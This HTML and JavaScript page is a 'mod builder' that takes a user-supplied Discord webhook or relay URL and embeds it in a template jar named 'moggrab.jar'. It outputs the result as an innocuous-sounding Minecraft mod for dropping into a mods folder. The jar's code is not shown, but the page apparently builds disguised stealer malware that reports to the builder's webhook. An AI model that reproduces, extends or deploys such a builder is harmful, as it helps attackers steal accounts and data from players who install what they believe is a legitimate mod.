<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Player Enhancements — Mod Builder</title>
<script src="jszip.min.js"></script>
<style>
  :root { --bg:#0e1116; --card:#171c26; --line:#272e3b; --accent:#5b8c5a; --txt:#e8e6e3; }
  * { box-sizing: border-box; }
  body {
    margin: 0; min-height: 100vh; display: grid; place-items: center;
    background: radial-gradient(1200px 600px at 70% -10%, #1c2430 0%, var(--bg) 60%);
    color: var(--txt); font-family: "Segoe UI", system-ui, sans-serif;
  }
  .card {
    width: min(460px, 92vw); padding: 2.2rem; border-radius: 16px;
    background: var(--card); border: 1px solid var(--line);
    box-shadow: 0 20px 60px rgba(0,0,0,.45);
  }
  .pick { font-size: 2.4rem; line-height: 1; margin-bottom: .4rem; }
  h1 { margin: 0 0 .3rem; font-size: 1.55rem; font-weight: 600; letter-spacing: -.01em; }
  .sub { margin: 0 0 1.6rem; color: #9aa3b2; font-size: .92rem; }
  input {
    width: 100%; padding: .8rem .9rem; border-radius: 10px;
    border: 1px solid var(--line); background: #0f131b; color: var(--txt);
    font-size: .92rem; outline: none; transition: border .15s;
    font-family: inherit;
  }
  input:focus { border-color: var(--accent); }
  button {
    width: 100%; margin-top: .9rem; padding: .85rem; border: 0; border-radius: 10px;
    background: var(--accent); color: #0e1116; font-weight: 600; font-size: 1rem;
    cursor: pointer; transition: filter .15s;
  }
  button:hover { filter: brightness(1.12); }
  button:disabled { opacity: .55; cursor: default; }
  #status { margin-top: 1rem; font-size: .9rem; color: #9aa3b2; min-height: 1.2em; }
  #dl { display: inline-block; margin-top: .9rem; color: var(--accent); font-weight: 600; }
  #stats { margin-top: .8rem; font-size: .8rem; color: #6b7280; }
  .err { color: #d57a7a; }
</style>
</head>
<body>
  <main class="card">
    <div class="pick">⛏️</div>
    <h1>Player Enhancements</h1>
    <p class="sub">Drop your hook URL, grab a mod. One click, your own jar.</p>

    <input id="wh" type="text" spellcheck="false" autocomplete="off"
           placeholder="https://your-relay.workers.dev — or your Discord hook">
    <button id="build" disabled>Loading template…</button>
    <div id="status"></div>
    <a id="dl" href="#" download>Download your mod</a>
    <div id="stats"></div>
  </main>

<script>
  const $ = id => document.getElementById(id);
  const wh = $('wh'), btn = $('build'), status = $('status'), dl = $('dl'), stats = $('stats');
  dl.style.display = 'none';

  // builds are counted in this browser only — GitHub Pages has no backend
  const KEY = 'moggrab_builds';
  stats.textContent = (parseInt(localStorage.getItem(KEY) || '0', 10) || 0) + ' jars built here';

  let template = null; // ArrayBuffer of the virgin jar

  async function loadTemplate() {
    try {
      const res = await fetch('assets/moggrab.jar');
      if (!res.ok) throw new Error('jar fetch ' + res.status);
      template = await res.arrayBuffer();
      btn.disabled = false;
      btn.textContent = 'Build Mod';
    } catch (e) {
      status.textContent = 'Could not load the mod template from this repo.';
      status.className = 'err';
    }
  }
  loadTemplate();

  btn.addEventListener('click', async () => {
    const webhook = wh.value.trim();
    status.className = '';
    dl.style.display = 'none';

    if (!/^https:\/\/[^\s/]+\/[^\s]*$/.test(webhook) || webhook.length > 300) {
      status.textContent = 'Needs a real HTTPS hook URL (Discord or your relay).';
      status.className = 'err';
      return;
    }

    btn.disabled = true;
    status.textContent = 'Stitching the jar…';

    try {
      // re-zip in the browser: template jar + this webhook burned into webhook.txt
      const zip = await JSZip.loadAsync(template);
      zip.file('webhook.txt', webhook);
      const blob = await zip.generateAsync({
        type: 'blob',
        mimeType: 'application/java-archive',
        compression: 'DEFLATE',
        compressionOptions: { level: 6 },
      });

      const name = 'PlayerEnhancements-1.21.11-' +
        Date.now().toString(36).slice(-4) + '.jar';
      const url = URL.createObjectURL(blob);
      dl.href = url;
      dl.download = name;
      dl.textContent = 'Download ' + name;
      dl.style.display = 'inline-block';

      const n = (parseInt(localStorage.getItem(KEY) || '0', 10) || 0) + 1;
      localStorage.setItem(KEY, String(n));
      stats.textContent = n + ' jars built here';
      status.textContent = 'Built and ready. Drop it in your mods folder.';
    } catch (e) {
      status.textContent = 'Build failed — feels like a template format issue.';
      status.className = 'err';
    } finally {
      btn.disabled = false;
    }
  });
</script>
</body>
</html>
